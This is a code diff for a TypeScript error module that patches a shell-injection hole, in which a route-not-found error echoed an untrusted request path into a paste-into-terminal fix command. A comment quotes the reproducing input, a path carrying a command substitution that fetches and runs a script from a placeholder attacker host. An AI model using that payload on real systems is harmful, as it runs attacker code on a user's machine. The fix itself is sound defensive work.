@@ -4,6 +4,7 @@
 import {
   registerErrorCodes,
   registerErrorRetry,
+  renderFixShellArg,
   renderThrowable,
   UltimateError,
 } from '@ultimat3/core';
@@ -152,11 +153,20 @@ export class HttpError extends UltimateError {
   }
 }
 
+/**
+ * The pathname is whatever an anonymous caller typed, and `fix:` is a COMMAND POSITION — so it
+ * goes through `renderFixShellArg`, which passes an ordinary path through and substitutes a
+ * placeholder for anything a shell would read. `renderFixLiteral` is the wrong tool here and
+ * cannot be made right: it answers double quotes, in which `$(…)` and backticks are still live.
+ * Reproduced: `GET /$(curl -s http://evil.sh|sh)` rendered that substitution verbatim into a line
+ * whose whole purpose is to be pasted into a terminal.
+ */
 export const routeNotFound = (method: string, pathname: string): HttpError =>
   new HttpError({
     code: 'X_ROUTE_NOT_FOUND',
+    // The value itself still travels, in the field that is read rather than run.
     cause: `no route registered for ${method} ${pathname}`,
-    fix: `x routes list --json   # then: x g route ${pathname}`,
+    fix: `x routes list --json   # then: x g route ${renderFixShellArg(pathname, '<the path the cause names>')}`,
   });
 
 export const methodNotAllowed = (
